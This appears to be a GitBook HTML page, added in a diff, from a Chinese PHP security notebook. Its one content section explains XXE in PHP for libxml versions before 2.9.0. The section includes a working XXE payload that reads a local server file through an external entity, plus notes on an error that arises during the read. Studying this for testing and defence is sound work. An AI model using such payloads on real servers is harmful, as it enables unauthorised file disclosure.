@@ -1,0 +1,931 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>XXE · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+    <link rel="prev" href="函数妙用.md" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    更新日志
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="重构函数和反射.html">
+            
+                <a href="重构函数和反射.html">
+            
+                    
+                    重构函数和反射
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="PHP是一门动态语言.html">
+            
+                <a href="PHP是一门动态语言.html">
+            
+                    
+                    PHP是动态语言
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="编码.html">
+            
+                <a href="编码.html">
+            
+                    
+                    PHP编码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="参数传递.html">
+            
+                <a href="参数传递.html">
+            
+                    
+                    参数传递
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="REQUEST数组.html">
+            
+                <a href="REQUEST数组.html">
+            
+                    
+                    REQUEST数组数值获取顺序
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.5" data-path="url非法键值替换问题.html">
+            
+                <a href="url非法键值替换问题.html">
+            
+                    
+                    GET数组键值特殊字符替换
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.6" data-path="弱比较.html">
+            
+                <a href="弱比较.html">
+            
+                    
+                    弱比较浅析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.7" data-path="命名空间.html">
+            
+                <a href="命名空间.html">
+            
+                    
+                    命名空间浅析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.8" data-path="匿名函数.html">
+            
+                <a href="匿名函数.html">
+            
+                    
+                    匿名函数浅析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.9" data-path="回调函数.html">
+            
+                <a href="回调函数.html">
+            
+                    
+                    回调函数浅析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.10" data-path="重构函数和反射.html">
+            
+                <a href="重构函数和反射.html">
+            
+                    
+                    重构函数和反射
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.11" data-path="利用函数进行数据收集.html">
+            
+                <a href="利用函数进行数据收集.html">
+            
+                    
+                    利用函数进行数据的收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.12" data-path="pcre回溯问题.html">
+            
+                <a href="pcre回溯问题.html">
+            
+                    
+                    pcre回溯问题
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.13" data-path="Session不同解析方式.html">
+            
+                <a href="Session不同解析方式.html">
+            
+                    
+                    SESSION的不同解析方式
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" >
+            
+                <span>
+            
+                    
+                    技巧
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="问题函数.html">
+            
+                <a href="问题函数.html">
+            
+                    
+                    问题函数
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="绕过open_basedir.html">
+            
+                <a href="绕过open_basedir.html">
+            
+                    
+                    绕过open_basedir
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="绕过disable_function.html">
+            
+                <a href="绕过disable_function.html">
+            
+                    
+                    绕过disable_function
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="函数妙用.md">
+            
+                <span>
+            
+                    
+                    循环嵌套函数Getshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.3" data-path="PHP和XXE.html">
+            
+                <a href="PHP和XXE.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" >
+            
+                <span>
+            
+                    
+                    反序列化
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="ctf_unserialize.html">
+            
+                <a href="ctf_unserialize.html">
+            
+                    
+                    CTF中的反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="查找存在指定魔术方法的类.html">
+            
+                <a href="查找存在指定魔术方法的类.html">
+            
+                    
+                    查找存在指定魔术方法的类
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.3" data-path="SimpleXMLElement.html">
+            
+                <a href="SimpleXMLElement.html">
+            
+                    
+                    SimpleXMLElement
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.4" data-path="Phar的文件包含与反序列化.html">
+            
+                <a href="Phar的文件包含与反序列化.html">
+            
+                    
+                    Phar的文件包含与反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.5" data-path="Soap和CRLF攻击.html">
+            
+                <a href="Soap和CRLF攻击.html">
+            
+                    
+                    Soap和CRLF攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.6" data-path="Session不同解析方式.html">
+            
+                <a href="Session不同解析方式.html">
+            
+                    
+                    SESSION的不同解析方式
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" >
+            
+                <span>
+            
+                    
+                    文件上传
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.5.1" data-path="PHP7的2个core_dumped错误.html">
+            
+                <a href="PHP7的2个core_dumped错误.html">
+            
+                    
+                    上传临时文件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.2" data-path="../VUL/CVE-2015-2348_00截断.html">
+            
+                <a href="../VUL/CVE-2015-2348_00截断.html">
+            
+                    
+                    00截断
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.3" data-path="../VUL/文件上传相关函数.html">
+            
+                <a href="../VUL/文件上传相关函数.html">
+            
+                    
+                    文件上传相关函数
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.4" data-path="../VUL/二次渲染绕过.html">
+            
+                <a href="../VUL/二次渲染绕过.html">
+            
+                    
+                    二次渲染绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.5" data-path="../VUL/代码逻辑绕过.html">
+            
+                <a href="../VUL/代码逻辑绕过.html">
+            
+                    
+                    代码逻辑绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.6" data-path="../VUL/usr.ini绕过.html">
+            
+                <a href="../VUL/usr.ini绕过.html">
+            
+                    
+                    上传.usr.ini
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.7" data-path="../VUL/htaccess上传绕过.html">
+            
+                <a href="../VUL/htaccess上传绕过.html">
+            
+                    
+                    上传.htaccess
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6" >
+            
+                <span>
+            
+                    
+                    文件包含
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.6.1" data-path="伪协议文件包含.html">
+            
+                <a href="伪协议文件包含.html">
+            
+                    
+                    PHP伪协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.2" data-path="包含日志.html">
+            
+                <a href="包含日志.html">
+            
+                    
+                    包含日志
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.3" data-path="包含environ.html">
+            
+                <a href="包含environ.html">
+            
+                    
+                    包含environ
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.4" data-path="PHP7的2个core_dumped错误.html">
+            
+                <a href="PHP7的2个core_dumped错误.html">
+            
+                    
+                    包含临时文件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.5" data-path="包含session文件.html">
+            
+                <a href="包含session文件.html">
+            
+                    
+                    包含SESSION文件
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7" >
+            
+                <span>
+            
+                    
+                    版本迭代
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.7.1" data-path="PHP7.0.html">
+            
+                <a href="PHP7.0.html">
+            
+                    
+                    PHP7.0
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7.2" data-path="PHP7.1.html">
+            
+                <a href="PHP7.1.html">
+            
+                    
+                    PHP7.1
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7.3" data-path="PHP7.2.html">
+            
+                <a href="PHP7.2.html">
+            
+                    
+                    PHP7.2
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8" >
+            
+                <span>
+            
+                    
+                    杂项
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.8.1" data-path="M1_VSCODE调试php源码.html">
+            
+                <a href="M1_VSCODE调试php源码.html">
+            
+                    
+                    M1_VSCODE调试php源码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.2" data-path="CGI_FastCGI和PHP-FPM关系.html">
+            
+                <a href="CGI_FastCGI和PHP-FPM关系.html">
+            
+                    
+                    CGI_FastCGI和PHP-FPM关系
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.3" data-path="PHP的编译与执行.html">
+            
+                <a href="PHP的编译与执行.html">
+            
+                    
+                    PHP的编译与执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >XXE</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="xxe">XXE</h1>
+<p>&#x53D7;&#x5230;&#x5F71;&#x54CD;&#x7684;&#x7C7B;&#x548C;&#x51FD;&#x6570;
+<code>SimpleXMLElement</code>&#x3001;<code>DOMDocument</code>&#x3001;<code>simplexml_load_string</code>
+(libxml&lt;2.9.0, PHP 5, PHP 7)
+libxml2.9.0&#x4EE5;&#x540E;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E0D;&#x89E3;&#x6790;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#xFF0C;&#x5BFC;&#x81F4;XXE&#x6F0F;&#x6D1E;&#x9010;&#x6E10;&#x6D88;&#x4EA1;&#x3002;&#x4E3A;&#x4E86;&#x6F14;&#x793A;PHP&#x73AF;&#x5883;&#x4E0B;&#x7684;XXE&#x6F0F;&#x6D1E;&#xFF0C;&#x672C;&#x4F8B;&#x4F1A;&#x5C06;libxml2.8.0&#x7248;&#x672C;&#x7F16;&#x8BD1;&#x8FDB;PHP&#x4E2D;&#x3002;PHP&#x7248;&#x672C;&#x5E76;&#x4E0D;&#x5F71;&#x54CD;XXE&#x5229;&#x7528;&#x3002;</p>
+<p>&#x53C2;&#x8003;</p>
+<pre><code>- https://github.com/vulhub/vulhub/tree/master/php/php_xxe
+- https://www.kingkk.com/2018/07/%E7%AE%80%E6%9E%90XXE/
+- https://www.php.net/manual/en/class.simplexmlelement.php
+- https://stackoverflow.com/questions/51103431/parsepi-pi-php-never-end-when-trying-to-run-a-new-unit-test
+</code></pre><p>payload&#xFF1A;</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span> 
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///var/www/html/dom.php&quot;</span> &gt;]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/root&gt;
+</code></pre>
+<p>&#x5728;&#x83B7;&#x53D6;dom.php&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x6700;&#x5F00;&#x59CB;&#x4F1A;&#x62A5;&#x9519;
+<code>DOMDocument::loadXML(): ParsePI: PI php never end ... in file:///var/www/html/dom.php, line: 7 in</code>
+&#x8FD9;&#x662F;&#x56E0;&#x4E3A;xml&#x628A;<code>&lt;?php</code>&#x8BC6;&#x522B;&#x4E3A;&#x6807;&#x7B7E;&#x7684;&#x5F00;&#x59CB;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x6CA1;&#x6709;&#x51FA;&#x73B0;&#x6807;&#x7B7E;&#x7684;&#x7ED3;&#x675F;<code>&gt;</code>&#xFF0C;&#x52A0;&#x4E0A;&#x5C31;&#x597D;&#x4E86;&#x3002;</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="函数妙用.md" class="navigation navigation-prev navigation-unique" aria-label="Previous page: 循环嵌套函数Getshell">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"XXE","level":"2.3","depth":1,"next":{"title":"反序列化","level":"2.4","depth":1,"ref":"","articles":[{"title":"CTF中的反序列化","level":"2.4.1","depth":2,"path":"PHP/ctf_unserialize.md","ref":"./PHP/ctf_unserialize.md","articles":[]},{"title":"查找存在指定魔术方法的类","level":"2.4.2","depth":2,"path":"PHP/查找存在指定魔术方法的类.md","ref":"./PHP/查找存在指定魔术方法的类.md","articles":[]},{"title":"SimpleXMLElement","level":"2.4.3","depth":2,"path":"PHP/SimpleXMLElement.md","ref":"./PHP/SimpleXMLElement.md","articles":[]},{"title":"Phar的文件包含与反序列化","level":"2.4.4","depth":2,"path":"PHP/Phar的文件包含与反序列化.md","ref":"./PHP/Phar的文件包含与反序列化.md","articles":[]},{"title":"Soap和CRLF攻击","level":"2.4.5","depth":2,"path":"PHP/Soap和CRLF攻击.md","ref":"./PHP/Soap和CRLF攻击.md","articles":[]},{"title":"SESSION的不同解析方式","level":"2.4.6","depth":2,"path":"PHP/Session不同解析方式.md","ref":"./PHP/Session不同解析方式.md","articles":[]}]},"previous":{"title":"循环嵌套函数Getshell","level":"2.2.4","depth":2,"path":"PHP/函数妙用.md","ref":"./PHP/函数妙用.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/PHP和XXE.md","mtime":"2021-06-01T01:41:12.621Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-06-01T02:44:35.931Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
